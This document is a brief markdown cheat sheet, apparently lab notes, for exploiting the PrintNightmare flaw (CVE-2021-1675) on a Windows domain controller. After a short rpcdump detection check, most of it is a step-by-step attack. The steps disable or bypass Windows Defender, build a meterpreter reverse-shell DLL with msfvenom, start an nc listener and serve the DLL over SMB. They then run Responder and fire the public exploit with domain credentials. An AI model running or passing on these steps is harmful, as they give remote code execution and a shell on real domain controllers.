- - -
Exploit Link : [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)
- - -

## Detection ?
run this impacket to cheak :

```python
rpcdump.py @<DC-IP> | egrep 'MS-RPRN|MS-PAR'
```

If the output looks like this : Then it's vulnerable. 
![Imgur](https://i.imgur.com/K7T5a4S.png)

- - -
## Attacking Steps :
Be sure that windows defender is turned off **or** we can perform some AD-Bypass.

```python
pip3 uninstall impacket ; git clone https://github.com/cube0x0/impacket ; cd impacket ; python3 ./setup.py install
```

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<our-ip> LPORT=9090 -f dll > shell.dll 
```

```sh
nc -nvlp 9090 
```

Now host that **shell.dll** file. 

```python
smbserver.py share `pwd` -smb2support 
```

```sh
responder -I tun0 -v 
```

```sh
git clone https://github.com/cube0x0/CVE-2021-1675.git ; cd CVE-2021-1675/ ; chmod 755 * 
```

```python
./CVE-2021-1675.py marvel.local/domain_user:Password1@<DC-IP> '\\<our-ip>\share\shell.dll' 
```

- - -

